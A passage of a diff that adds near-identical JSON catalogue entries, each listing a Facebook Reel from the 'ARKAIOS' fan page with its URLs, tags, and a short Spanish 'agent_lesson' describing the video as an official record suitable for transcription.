+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1778035793427842/",
+    "canonical_url": "https://www.facebook.com/reel/1778035793427842/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1778035793427842/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1778035793427842/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1778035793427842/"
+  },
+  {
+    "id": "meta-776644758860856_122178272096989266",
+    "title": "ARKAIOS Reel #1760883838514298",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1760883838514298/",
+    "canonical_url": "https://www.facebook.com/reel/1760883838514298/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1760883838514298/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1760883838514298/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1760883838514298/"
+  },
+  {
+    "id": "meta-776644758860856_122178205904989266",
+    "title": "ARKAIOS Reel #1356984709094326",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1356984709094326/",
+    "canonical_url": "https://www.facebook.com/reel/1356984709094326/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1356984709094326/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1356984709094326/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1356984709094326/"
+  },
+  {
+    "id": "meta-776644758860856_122178204890989266",
+    "title": "ARKAIOS Reel #989652967283058",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/989652967283058/",
+    "canonical_url": "https://www.facebook.com/reel/989652967283058/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/989652967283058/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/989652967283058/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/989652967283058/"
+  },
+  {
+    "id": "meta-776644758860856_122178203882989266",
+    "title": "ARKAIOS Reel #1134144492517291",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1134144492517291/",
+    "canonical_url": "https://www.facebook.com/reel/1134144492517291/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1134144492517291/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1134144492517291/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1134144492517291/"
+  },
+  {
+    "id": "meta-776644758860856_122178202304989266",
+    "title": "ARKAIOS Reel #4542877395966393",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4542877395966393/",
+    "canonical_url": "https://www.facebook.com/reel/4542877395966393/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4542877395966393/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4542877395966393/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4542877395966393/"
+  },
+  {
+    "id": "meta-776644758860856_122178202130989266",
+    "title": "ARKAIOS Reel #1431409542182612",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1431409542182612/",
+    "canonical_url": "https://www.facebook.com/reel/1431409542182612/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1431409542182612/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1431409542182612/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1431409542182612/"
+  },
+  {
+    "id": "meta-776644758860856_122178201782989266",
+    "title": "ARKAIOS Reel #2943463789371979",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2943463789371979/",
+    "canonical_url": "https://www.facebook.com/reel/2943463789371979/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2943463789371979/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2943463789371979/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2943463789371979/"
+  },
+  {
+    "id": "meta-776644758860856_122178200150989266",
+    "title": "ARKAIOS Reel #1455856453120443",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1455856453120443/",
+    "canonical_url": "https://www.facebook.com/reel/1455856453120443/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1455856453120443/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1455856453120443/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1455856453120443/"
+  },
+  {
+    "id": "meta-776644758860856_122178199994989266",
+    "title": "ARKAIOS Reel #3731254777027546",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/3731254777027546/",
+    "canonical_url": "https://www.facebook.com/reel/3731254777027546/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/3731254777027546/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/3731254777027546/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/3731254777027546/"
+  },
+  {
+    "id": "meta-776644758860856_122178198782989266",
+    "title": "ARKAIOS Reel #2224334011463858",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2224334011463858/",
+    "canonical_url": "https://www.facebook.com/reel/2224334011463858/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2224334011463858/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2224334011463858/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2224334011463858/"
+  },
+  {
+    "id": "meta-776644758860856_122178198182989266",
+    "title": "ARKAIOS Reel #851662474640809",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/851662474640809/",
+    "canonical_url": "https://www.facebook.com/reel/851662474640809/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/851662474640809/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/851662474640809/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/851662474640809/"
+  },
+  {
+    "id": "meta-776644758860856_122178197828989266",
+    "title": "ARKAIOS Reel #1142067345170950",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1142067345170950/",
+    "canonical_url": "https://www.facebook.com/reel/1142067345170950/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1142067345170950/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1142067345170950/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1142067345170950/"
+  },
+  {
+    "id": "meta-776644758860856_122178197660989266",
+    "title": "ARKAIOS Reel #4699013707001898",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4699013707001898/",
+    "canonical_url": "https://www.facebook.com/reel/4699013707001898/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4699013707001898/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4699013707001898/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4699013707001898/"
+  },
+  {
+    "id": "meta-776644758860856_122178195206989266",
+    "title": "ARKAIOS Reel #2558556751294204",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2558556751294204/",
+    "canonical_url": "https://www.facebook.com/reel/2558556751294204/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2558556751294204/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2558556751294204/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2558556751294204/"
+  },
+  {
+    "id": "meta-776644758860856_122178190658989266",
+    "title": "ARKAIOS Reel #944363604991905",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/944363604991905/",
+    "canonical_url": "https://www.facebook.com/reel/944363604991905/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/944363604991905/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/944363604991905/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/944363604991905/"
+  },
+  {
+    "id": "meta-776644758860856_122178190274989266",
+    "title": "ARKAIOS Reel #28545216128470045",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/28545216128470045/",
+    "canonical_url": "https://www.facebook.com/reel/28545216128470045/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/28545216128470045/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/28545216128470045/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/28545216128470045/"
+  },
+  {
+    "id": "meta-776644758860856_122178163046989266",
+    "title": "ARKAIOS Reel #2254260215463312",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2254260215463312/",
+    "canonical_url": "https://www.facebook.com/reel/2254260215463312/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2254260215463312/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2254260215463312/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2254260215463312/"
+  },
+  {
+    "id": "meta-776644758860856_122178162932989266",
+    "title": "ARKAIOS Reel #1606474120401944",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1606474120401944/",
+    "canonical_url": "https://www.facebook.com/reel/1606474120401944/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1606474120401944/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1606474120401944/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1606474120401944/"
+  },
+  {
+    "id": "meta-776644758860856_122178162770989266",
+    "title": "ARKAIOS Reel #1557491149117734",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1557491149117734/",
+    "canonical_url": "https://www.facebook.com/reel/1557491149117734/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1557491149117734/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1557491149117734/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1557491149117734/"
+  },
+  {
+    "id": "meta-776644758860856_122178162428989266",
+    "title": "ARKAIOS Reel #2350807165725275",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2350807165725275/",
+    "canonical_url": "https://www.facebook.com/reel/2350807165725275/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2350807165725275/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2350807165725275/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2350807165725275/"
+  },
+  {
+    "id": "meta-776644758860856_122178162296989266",
+    "title": "ARKAIOS Reel #1602403008023321",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1602403008023321/",
+    "canonical_url": "https://www.facebook.com/reel/1602403008023321/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1602403008023321/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1602403008023321/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1602403008023321/"
+  },
+  {
+    "id": "meta-776644758860856_122178162068989266",
+    "title": "ARKAIOS Reel #1480539550792674",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1480539550792674/",
+    "canonical_url": "https://www.facebook.com/reel/1480539550792674/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1480539550792674/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1480539550792674/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1480539550792674/"
+  },
+  {
+    "id": "meta-776644758860856_122178161654989266",
+    "title": "ARKAIOS Reel #1817000342640848",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1817000342640848/",
+    "canonical_url": "https://www.facebook.com/reel/1817000342640848/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1817000342640848/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1817000342640848/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1817000342640848/"
+  },
+  {
+    "id": "meta-776644758860856_122178126800989266",
+    "title": "ARKAIOS Reel #1064056336684925",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1064056336684925/",
+    "canonical_url": "https://www.facebook.com/reel/1064056336684925/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1064056336684925/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1064056336684925/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1064056336684925/"
+  },
+  {
+    "id": "meta-776644758860856_122177884274989266",
+    "title": "ARKAIOS Reel #1595725448946784",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1595725448946784/",
+    "canonical_url": "https://www.facebook.com/reel/1595725448946784/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1595725448946784/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1595725448946784/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1595725448946784/"
+  },
+  {
+    "id": "meta-776644758860856_122177847992989266",
+    "title": "ARKAIOS Reel #2160277807887380",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2160277807887380/",
+    "canonical_url": "https://www.facebook.com/reel/2160277807887380/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2160277807887380/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2160277807887380/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2160277807887380/"
+  },
+  {
+    "id": "meta-776644758860856_122177798786989266",
+    "title": "ARKAIOS Reel #937250365699709",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/937250365699709/",
+    "canonical_url": "https://www.facebook.com/reel/937250365699709/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/937250365699709/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/937250365699709/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/937250365699709/"
+  },
+  {
+    "id": "meta-776644758860856_122177776310989266",
+    "title": "ARKAIOS Reel #2100310350570913",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2100310350570913/",
+    "canonical_url": "https://www.facebook.com/reel/2100310350570913/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2100310350570913/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2100310350570913/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2100310350570913/"
+  },
+  {
+    "id": "meta-776644758860856_122177775326989266",
+    "title": "ARKAIOS Reel #1095854413250756",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1095854413250756/",
+    "canonical_url": "https://www.facebook.com/reel/1095854413250756/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1095854413250756/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1095854413250756/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1095854413250756/"
+  },
+  {
+    "id": "meta-776644758860856_122176936376989266",
+    "title": "ARKAIOS Reel #1342919901379785",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1342919901379785/",
+    "canonical_url": "https://www.facebook.com/reel/1342919901379785/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1342919901379785/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1342919901379785/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1342919901379785/"
+  },
+  {
+    "id": "meta-776644758860856_122176933910989266",
+    "title": "ARKAIOS Reel #2928213187511598",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2928213187511598/",
+    "canonical_url": "https://www.facebook.com/reel/2928213187511598/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2928213187511598/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2928213187511598/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2928213187511598/"
+  },
+  {
+    "id": "meta-776644758860856_122176933532989266",
+    "title": "ARKAIOS Reel #1654920079619082",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1654920079619082/",
+    "canonical_url": "https://www.facebook.com/reel/1654920079619082/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1654920079619082/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1654920079619082/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
